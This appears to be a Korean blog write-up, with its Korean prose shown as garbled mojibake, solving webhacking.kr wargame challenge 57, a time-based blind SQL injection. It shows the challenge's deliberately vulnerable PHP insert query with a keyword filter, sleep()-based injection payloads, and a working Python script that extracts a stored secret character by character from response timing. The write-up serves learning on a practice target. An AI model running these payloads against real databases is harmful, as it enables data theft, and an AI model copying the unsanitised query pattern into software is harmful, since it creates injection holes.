---
title: "[webhacking.kr] 57ë²ˆ ë¬¸ì œ í’€ì´[Time-based SQL Injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
  - time-based
toc: true
toc_sticky: true
toc_label: "54ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 57ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/154034732-b90237e9-6f81-40af-bc0e-c4ccb895f0c2.png)

  
  ```php
<?php
  $db = dbconnect();
  if($_GET['msg'] && isset($_GET['se'])){
    $_GET['msg'] = addslashes($_GET['msg']);
    $_GET['se'] = addslashes($_GET['se']);
    if(preg_match("/select|and|or|not|&|\||benchmark/i",$_GET['se'])) exit("Access Denied");
    mysqli_query($db,"insert into chall57(id,msg,pw,op) values('{$_SESSION['id']}','{$_GET['msg']}','{$flag}',{$_GET['se']})");
    echo "Done<br><br>";
    if(rand(0,100) == 1) mysqli_query($db,"delete from chall57");
  }
?>
  ```

# ë¬¸ì œ í’€ì´
  ì¸ì ì…˜ì„ í•´ì•¼ í•˜ëŠ” ë¶€ë¶„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```sql
insert into chall57(id,msg,pw,op) values('id','{msg}','flag',{se})
```

ì‚¬ìš©ì ë‹¨ì—ì„œ ë³€ê²½ ê°€ëŠ¥í•œ ë¶€ë¶„ì€ msgì™€ se ë¶€ë¶„ì´ ìˆìŠµë‹ˆë‹¤. ì´ë¬¸ì œê°€ ê¸°ì¡´ì˜ sql ë¬¸ì œë“¤ê³¼ ë‹¤ë¥¸ì ì€ í™”ë©´ì— ì¶œë ¥ë˜ëŠ” ê°’ì´ ì—†ë‹¤ëŠ” ì ì…ë‹ˆë‹¤. ì¦‰ `select` ë¬¸ì´ ì—†ì´ DBì— ìˆëŠ” ë°ì´í„°ì˜ ê°’ì„ ì½ì–´ì™€ì•¼ í•©ë‹ˆë‹¤. 

ë³´í†µì˜ blind sql injectionì˜ ê²½ìš° ì°¸/ ê±°ì§“ì˜ ê²°ê³¼ê°€ ë‚˜ì˜¤ê¸° ë•Œë¬¸ì— ì›í•˜ëŠ” ì¿¼ë¦¬ë¬¸ì˜ ê²°ê³¼ë¥¼ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì§€ê¸ˆê°™ì€ ê²½ìš°ëŠ” insert ë¬¸ì„ í†µí•´ì„œ ì›í•˜ëŠ” ì¿¼ë¦¬ë¬¸ì˜ ê²°ê³¼ë¥¼ ì•Œì•„ì•¼ í•˜ëŠ”ë° ê·¸ëŸ´ë•Œ ì‚¬ìš© ê°€ëŠ¥í•œ ê¸°ë²•ì´ Time-Based SQL Injection ì…ë‹ˆë‹¤. 

ì´ ê¸°ë²•ì€ ë‹¤ìŒê³¼ ê°™ì´ ì´ìš©í•˜ì—¬, ì„œë²„ì—ì„œ ì˜¤ëŠ” ì‘ë‹µì‹œê°„ì„ ë³´ê³  ì¿¼ë¦¬ë¬¸ì˜ ì°¸/ê±°ì§“ì„ íŒë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```sql
insert into chall57 values('id','msg','flag',if(1=1,sleep(3),1)) #ì°¸ì¸ê²½ìš° ì‘ë‹µì´ 3ì´ˆë’¤ì— ë‚˜ì˜µë‹ˆë‹¤

insert into chall57 values('id','msg','flag',if(1=2,sleep(3),1)) # ê±°ì§“ì¸ ê²½ìš° ì‘ë‹µì´ ë°”ë¡œ ë‚˜ì˜µë‹ˆë‹¤.

```

![image](https://user-images.githubusercontent.com/33647663/154036523-6e1a6b40-034a-40bb-b473-0cee9257927d.png)

ë¬¸ì œì—ì„œ ì ìš©í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ 3ì´ˆë’¤ì— í™”ë©´ì´ ìƒˆë¡œê³ ì¹¨ ë©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/154036917-0ca3d3dc-eeec-422d-88bc-a87c58c227d4.png)



Time-Based SQL Injectionì€ ì¼ë°˜ì ìœ¼ë¡œ Sleep í•¨ìˆ˜ì™€ benchmark í•¨ìˆ˜ë¥¼ ì´ìš©í•  ìˆ˜ ìˆëŠ”ë°, ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” benchmark í•¨ìˆ˜ê°€ í•„í„°ë§ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë‹¤ë¥¸ ë¬¸ì œì—ì„œ ë§Œì•½ sleepì´ í•„í„°ë§ ë˜ì–´ ìˆë‹¤ë©´ benchmark í•¨ìˆ˜ë¥¼ ì‚¬ìš© ê°€ëŠ¥í•˜ë‹¤ëŠ” ì ë„ ì¸ì§€í•˜ê³  ìˆìœ¼ì…”ì•¼ í•©ë‹ˆë‹¤.


íŒŒì´ì¬ ì½”ë“œë¡œ ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤.

```python
from requests.exceptions import ReadTimeout
import requests
import string

url = "https://webhacking.kr/challenge/web-34/index.php"
params = {'msg' : '1234'}
flag_length = 0
for i in range(20,30):
    try:
        payload = 'if((length(pw)={}),sleep(3),1)'.format(i)
        params['se'] = payload
        requests.get(url,params=params,timeout=2)
    except ReadTimeout:
        print("FLAG's length is",i)
        flag_length=i
        break    

# FLAG ê¸¸ì´ 24
flag = ''
for i in range(1,flag_length+1):
    for character in string.printable:
        try:
            payload = 'if((ascii(substr(pw,{},1))={}),sleep(3),1)'.format(i,ord(character))
            params['se'] = payload
            requests.get(url,params=params,timeout=2)
        except ReadTimeout:
            flag = flag + character
            print("\r[+]",flag,end='')
            break
print()
print('FLAG : ',flag)
```

![image](https://user-images.githubusercontent.com/33647663/154037062-6febfa07-d10d-410a-a3fa-5a4df15f98a7.png)